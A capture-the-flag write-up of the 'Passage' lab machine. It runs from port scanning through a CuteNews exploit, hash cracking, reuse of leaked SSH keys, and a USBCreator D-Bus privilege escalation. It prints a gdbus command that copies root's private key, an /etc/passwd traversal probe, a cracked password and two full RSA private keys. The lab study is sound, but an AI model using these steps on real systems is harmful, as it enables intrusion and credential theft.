#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 12:54 EDT
Nmap scan report for 10.10.10.206
Host is up (0.092s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/17%OT=22%CT=1%CU=40926%PV=Y%DS=2%DC=T%G=Y%TM=611BE9F
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   91.79 ms 10.10.14.1
2   91.94 ms 10.10.10.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds
```
#enumeration 
Donot run gobuster or you ll get a 2 min ip ban
```
Passage RSS Feed http://passage.htb/news.php en-us CuteNews **Implemented Fail2Ban** http://passage.htb/news.php?id=11 Due to unusally large amounts of traffic, 1592488043 Thu, 18 Jun 2020 09:47:23 -0400 Phasellus tristique urna http://passage.htb/news.php?id=8 Sed felis pharetra, nec sodales diam sagittis. 1591987514 Fri, 12 Jun 2020 14:45:14 -0400 Aenean dapibus nec http://passage.htb/news.php?id=7 Urna eget vulputate. 1591450298 Sat, 06 Jun 2020 09:31:38 -0400 Nullam metus tellus http://passage.htb/news.php?id=6 Ornare ut fringilla id, accumsan quis turpis. 1588433035 Sat, 02 May 2020 11:23:55 -0400 Fusce cursus, nulla in ultricies http://passage.htb/news.php?id=5 Posuere, lectus metus ultricies neque, eu pulvinar enim nisi id tortor. 1587128696 Fri, 17 Apr 2020 09:04:56 -0400 Maecenas varius convallis http://passage.htb/news.php?id=4 Nisi ut porta. 1586711095 Sun, 12 Apr 2020 13:04:55 -0400 Nunc facilisis ornare http://passage.htb/news.php?id=3 Arcu quis finibus. 1585405439 Sat, 28 Mar 2020 10:23:59 -0400 Sed porta lectus http://passage.htb/news.php?id=2 Vitae justo ultricies vehicula. 1584459160 Tue, 17 Mar 2020 11:32:40 -0400 Lorem ipsum dolor http://passage.htb/news.php?id=1 Sit amet, consectetur adipiscing elit. 1583243399 Tue, 03 Mar 2020 08:49:59 -0500
```
On clicking the rss page it redirected me to a page /CuteNews.php/rss.php
First tried of lfi but it was not there
```
<!--span><i class="icon-folder-close icon-blog-mini"></i> </span-->
      <span><i class="icon-comment icon-blog-mini"></i> <a href="/index.php?do=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=11">0 Comments</a></span>
     </div>
  Due to unusally large amounts of traffic,
     <a target="_blank" href="/index.php?do=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=11">View & Comment <i class="icon-angle-right"></i> </a>
  </div>
</div><!--blog-item-->
[10:31 PM]
sid@example.com
[10:31 PM]
kim@example.com
```
got these in the src code 
but noithing was useful 
then 
we moved to link:http://passage.htb/CuteNews/
there we had CuteNews 2.1.2
#reverseshellupload 
searching in searchsploit we got a exploit with 48000.py ran it and got a web shell. Upgraded it with socat.
then, we ran linpeas to get some hashes in the web directory folder /CuteNews/cdata/users/*.php
```
"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd"
```
Paul's hash was crackble so cracked it with crackstation to get pass:atlanta1*
Now su to paul with the pass and agin ran linpeas and got a starnge ssh pulic key and private key
```
-rw------- 1 paul paul 1679 Jul 21  2020 /home/paul/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----
-rw-r--r-- 1 paul paul 395 Jul 21  2020 /home/paul/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```
these were in the paul's directory but were of nadav's lol
so ssh to  nadav with the private key and we are in.
#rootescalation 
we ran linpeas and saw the vulnerable files in home directory there i got a file with name
.viminfo it basically gives information about the files that were used by vim to write
```
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
```
now i searched for priv esc for **polkit** and ***usb creator **
link:https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
link:https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
Now clearly
polkit one was not valid as we required the password of naveen to run it
I also gota script in exploit db but it didn't work
Though I didn't got any process with id 2096 running still tried the usb creator as i got a script in 
/usr/share/usb-creator 
```
import dbus
from gi.repository import GObject, GLib, UDisks
import dbus.service
import logging
import os
import time
logging.basicConfig(level=logging.DEBUG)

from dbus.mainloop.glib import DBusGMainLoop
from usbcreator.misc import (
    USBCreatorProcessException,
    find_on_path,
    popen,
    sane_path,
    )

USBCREATOR_IFACE = 'com.ubuntu.USBCreator'
PROPS_IFACE = 'org.freedesktop.DBus.Properties'

no_options = GLib.Variant('a{sv}', {})

loop_prefix = '/org/freedesktop/UDisks2/block_devices/loop'

sane_path()

def _get_object_path_from_device(device_name):
    if device_name.startswith('/dev/'):
        return '/org/freedesktop/UDisks2/block_devices/' + device_name[5:]
    return device_name

def _get_parent_object(udisks, device_name):
    obj = udisks.get_object(_get_object_path_from_device(device_name))
    if obj.get_partition_table():
        return obj
    partition = obj.get_partition()
    if not partition:
        return obj
    parent = partition.get_cached_property('Table').get_string()    
    return udisks.get_object(parent)
    
def unmount_all(udisks, parent):
    '''Unmounts the device or any partitions of the device.'''
    parent_path = parent.get_object_path()
    manager = udisks.get_object_manager()
    for obj in manager.get_objects():
        block = obj.get_block()
        partition = obj.get_partition()
        fs = obj.get_filesystem()
        if not (block and partition and fs):
            continue
        block_name = block.get_cached_property('Device').get_bytestring().decode('utf-8')
        table = partition.get_cached_property('Table').get_string()
        mounts = fs.get_cached_property('MountPoints').get_bytestring_array()
        if table == parent_path and len(mounts):
            logging.debug('Unmounting %s' % block_name)
            # We explictly avoid catching errors here so that failure to
            # unmount a partition causes the format method to fail with the
            # error floating up to the frontend.
            fs.call_unmount_sync(no_options, None)
            
    fs = parent.get_filesystem()
    if not fs:
        return
    dev_name = parent.get_block().get_cached_property('Device').get_bytestring().decode('utf-8')
    mounts = fs.get_cached_property('MountPoints').get_bytestring_array()
    if len(mounts):
        logging.debug('Unmounting %s' % dev_name)
        fs.call_unmount_sync(no_options, None)

def check_system_internal(device):
    block = device.get_block()
    is_system = block.get_cached_property('HintSystem').get_boolean()
    is_loop = block.get_object_path().startswith(loop_prefix) and not block.get_cached_property('ReadOnly').get_boolean()    
    if is_system and not is_loop:
        raise dbus.DBusException('com.ubuntu.USBCreator.Error.SystemInternal')

def mem_free():
    # Largely copied from partman-base.
    free = 0
    with open('/proc/meminfo') as meminfo:
        for line in meminfo:
            if line.startswith('MemFree:'):
                free += int(line.split()[1]) / 1024.0
            if line.startswith('Buffers:'):
                free += int(line.split()[1]) / 1024.0
    return free

class USBCreator(dbus.service.Object):
    def __init__(self):
        bus_name = dbus.service.BusName(USBCREATOR_IFACE, bus=dbus.SystemBus())
        dbus.service.Object.__init__(self, bus_name, '/com/ubuntu/USBCreator')
        self.dbus_info = None
        self.polkit = None

    def _builtin_dd(self, source, target, block_size=1000000):
        src_size = os.stat(source).st_size
        src = open(source, 'rb')
        dst = open(target, 'wb')
        written = 0
        current_progress = 0
        self.Progress(0)

        data = src.read(block_size)
        while(data):
            dst.write(data)
            written += len(data)
            # TODO: find a way to display progress without buffering
            new_progress = int(written / src_size * 100.0)
            if new_progress != current_progress:
                self.Progress(new_progress)
                current_progress = new_progress
            data = src.read(block_size)

        src.close()
        dst.close()

    @dbus.service.method(USBCREATOR_IFACE, in_signature='', out_signature='b')
    def KVMOk(self):
        mem = mem_free()
        logging.debug('Asked to run KVM with %f M free' % mem)
        if mem >= 768 and find_on_path('kvm-ok') and find_on_path('kvm'):
            import subprocess
            if subprocess.call(['kvm-ok']) == 0:
                return True
        return False

    @dbus.service.method(USBCREATOR_IFACE, in_signature='sa{ss}', out_signature='',
                         sender_keyword='sender', connection_keyword='conn')
    def KVMTest(self, device, env, sender=None, conn=None):
        '''Run KVM with the freshly created device as the first disk.'''
        self.check_polkit(sender, conn, 'com.ubuntu.usbcreator.kvm')
        for key in ('DISPLAY', 'XAUTHORITY'):
            if key not in env:
                logging.debug('Missing %s' % key)
                return
        udisks = UDisks.Client.new_sync(None)
        obj = _get_parent_object(udisks, device)
        # TODO unmount all the partitions.
        dev_file = obj.get_block().get_cached_property('Device').get_bytestring().decode('utf-8')
        if mem_free() >= 768:
            envp = []
            for k, v in env.items():
                envp.append('%s=%s' % (str(k), str(v)))
            cmd = ('kvm', '-m', '512', '-hda', str(dev_file))
            flags = (GObject.SPAWN_SEARCH_PATH)
            # Don't let SIGINT propagate to the child.
            GObject.spawn_async(cmd, envp=envp, flags=flags, child_setup=os.setsid)

    @dbus.service.method(USBCREATOR_IFACE, in_signature='ssb', out_signature='',
                         sender_keyword='sender', connection_keyword='conn')
    def Image(self, source, target, allow_system_internal,
              sender=None, conn=None):
        self.check_polkit(sender, conn, 'com.ubuntu.usbcreator.image')

        udisks = UDisks.Client.new_sync(None)
        obj = udisks.get_object(_get_object_path_from_device(target))
        logging.debug('Using target: %s' % target)
        if not allow_system_internal:
            check_system_internal(obj)

        start_time = time.time()
        self._builtin_dd(source.encode(), target.encode())
        logging.debug('Wrote image in %s seconds' % str(int(time.time() - start_time)))

    @dbus.service.signal(USBCREATOR_IFACE, signature='u')
    def Progress(self, value):
        pass

    @dbus.service.method(USBCREATOR_IFACE, in_signature='s', out_signature='',
                         sender_keyword='sender', connection_keyword='conn')
    def Unmount(self, device, sender=None, conn=None):
        self.check_polkit(sender, conn, 'com.ubuntu.usbcreator.mount')
        udisks = UDisks.Client.new_sync(None)
        parent = udisks.get_object(device)
        unmount_all(udisks, parent)

    @dbus.service.method(USBCREATOR_IFACE, in_signature='', out_signature='',
                         sender_keyword='sender', connection_keyword='conn')
    def Shutdown(self, sender=None, conn=None):
        logging.debug('Shutting down.')
        loop.quit()

    # Taken from Jockey 0.5.3.
    def check_polkit(self, sender, conn, priv):
        if sender is None and conn is None:
            return
        if self.dbus_info is None:
            self.dbus_info = dbus.Interface(conn.get_object(
                                            'org.freedesktop.DBus',
                                            '/org/freedesktop/DBus/Bus',
                                            False), 'org.freedesktop.DBus')
        pid = self.dbus_info.GetConnectionUnixProcessID(sender)
        if self.polkit is None:
            self.polkit = dbus.Interface(dbus.SystemBus().get_object(
                                'org.freedesktop.PolicyKit1',
                                '/org/freedesktop/PolicyKit1/Authority',
                                False), 'org.freedesktop.PolicyKit1.Authority')
        try:
            # we don't need is_challenge return here, since we call with
            # AllowUserInteraction
            (is_auth, _, details) = self.polkit.CheckAuthorization(
                                    ('system-bus-name', {'name': dbus.String(sender,
                                        variant_level = 1)}), priv, {'': ''},
                                    dbus.UInt32(1), '', timeout=600)
        except dbus.DBusException as e:
            if e._dbus_error_name == 'org.freedesktop.DBus.Error.ServiceUnknown':
                # polkitd timed out, connect again
                self.polkit = None
                return self.check_polkit(sender, conn, priv)
            else:
                raise

        if not is_auth:
            logging.debug('_check_polkit_privilege: sender %s on connection %s '
                          'pid %i is not authorized for %s: %s' %
                          (sender, conn, pid, priv, str(details)))
            raise dbus.DBusException('com.ubuntu.USBCreator.Error.NotAuthorized')

DBusGMainLoop(set_as_default=True)
helper = USBCreator()
loop = GLib.MainLoop()
loop.run()
```
similr to the one in the blog and thus ran 
```gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /lol.txt true```
to get the id_rsa of root 
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
+WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W
GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI
HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg
S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz
aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM
UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC
YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy
/6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7
yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY
q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T
TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy
T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV
sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q
a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP
WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j
MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c=
-----END RSA PRIVATE KEY-----
```
Now we do ssh and we are root 
